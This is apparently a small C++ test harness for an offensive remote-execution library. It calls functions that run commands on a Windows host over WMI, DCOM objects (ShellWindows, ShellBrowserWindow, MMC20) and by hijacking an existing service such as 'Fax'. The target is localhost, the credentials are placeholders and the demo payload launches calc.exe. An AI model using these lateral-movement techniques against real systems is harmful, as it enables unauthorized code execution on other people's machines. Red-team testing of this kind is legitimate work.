// @Author: y11en 
// @date: 2021/11/15


#include <tchar.h>
#include <stdio.h>
#include "one.h"


#define HOST  "127.0.0.1"
#define USER  "user"
#define PWD   "123456"
#define DOMAIN "."

#define EXE R"(C:\Windows\System32\cmd.exe)"
#define ARGS R"(/c calc.exe)"



void TestWMIExec_DcomExec()
{

    const wchar_t* host = _T(HOST);
    const wchar_t* user = _T(USER);
    const wchar_t* pwd = _T(PWD);
    const wchar_t* domain = _T(DOMAIN);
    const wchar_t* exe = _T(EXE);
    const wchar_t* args = _T(ARGS);

    WmiExecImp(host,
        user,
        pwd,
        domain,
        exe);


    /*
    
        ShellWindows
            适用于目标系统：Windows 7, Windows 10, Windows Server 2012R2 等
        ShellBrowserWindow
            适用于目标系统：Windows 10, Windows Server 2012R2
        MMC20
            适用于目标系统：Windows 7, Windows 10, Windows Server 2012R2 等

    */


    METHOD_DCOM method = METHOD_DCOM::EM_ShellBrowserWindow;

    DComExecImp(
        host,
        user,
        pwd,
        domain,
        exe,
        args, method);

}

void TestSrvExec()
{

    const char* host = HOST;
    const char* domain = DOMAIN;
	const char* user = USER;
    const char* pwd = PWD;
	const char* srvname = "Fax";        // 要劫持的服务名称，请注意必须是目标系统有的
    const char* payload = (EXE " " ARGS);

    SrvExecImp(host, 
        domain,
        user, 
        pwd,
		srvname, 
        payload);
}


int main()
{
    TestWMIExec_DcomExec();
    TestSrvExec();
	return 0;
}
